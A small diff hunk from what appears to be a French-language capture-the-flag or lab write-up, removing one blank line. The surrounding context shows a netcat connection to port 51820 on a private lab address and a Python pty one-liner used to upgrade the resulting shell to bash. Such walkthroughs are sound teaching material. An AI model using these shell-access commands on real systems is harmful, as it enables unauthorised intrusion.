@@ -75,7 +75,6 @@ Connexion au port `51820`
 └──╼ $nc 192.168.56.254 51820
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 hidden@cache:/$
-
 ```
 
 &nbsp;
